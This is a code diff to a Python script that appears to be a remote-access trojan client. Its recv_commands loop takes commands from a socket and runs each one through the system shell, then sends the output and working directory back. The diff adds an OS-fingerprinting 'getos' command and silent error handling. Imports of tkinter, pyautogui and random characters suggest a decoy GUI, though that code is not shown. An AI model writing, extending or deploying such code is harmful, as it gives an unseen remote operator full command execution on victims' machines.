@@ -1,10 +1,13 @@
-import multiprocessing
+# --------- Modules for GUI -------
+import tkinter as tk
+import random
+import pyautogui
+# ------- Modules for connecting to server adn executing commands -------
 import socket
 import subprocess
+import multiprocessing
 import os
-import tkinter as tk
-import pyautogui
-import random
+import platform
 
 # ------CONSTANTS-------
 HEADERSIZE = 10
@@ -28,7 +31,7 @@ def recv_commands():
             if new_msg:
                 #print("new msg len:",msg[:HEADERSIZE])
                 msglength = msg[:HEADERSIZE].decode("utf-8")
-                print("msg length {}".format(msglength.strip(" ")))
+                #print("msg length {}".format(msglength.strip(" ")))
                 try:
                     msglen = int(msglength)
                 except ValueError:
@@ -45,17 +48,25 @@ def recv_commands():
             if len(full_msg)-HEADERSIZE == msglen:
                 full_msg = full_msg[HEADERSIZE:]
                 if "cd" in full_msg:
-                    os.chdir(full_msg[3:])
+                    #print("testt")
+                    try:
+                        os.chdir(full_msg[3:])
+                    except:
+                        pass
                 if len(full_msg) > 0:
-                    cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    if "getos" == full_msg:
+                        output_bytes = bytes(str(platform.system() + "\n"), "utf-8")
+                    else:
+                        cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
+                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = str(output_bytes, "utf-8")
                     output_str = output_str + str(os.getcwd()) + '> '
-                    output_str = f"{len(output_str):<{HEADERSIZE}}"+ output_str
+                    output_str = f"{len(output_str):<{HEADERSIZE}}" + output_str
                     s.send(str.encode(output_str, "utf-8"))
                 full_msg = ""
                 new_msg = True
+
 
 chars = ['\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'q', 'w', 'e', 'r', 't',
          'y', 'u', 'i', 'o', 'p', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'A', 'S', 'D', 'S', 'F', 'G', 'H', 'J', 'K', 'L',
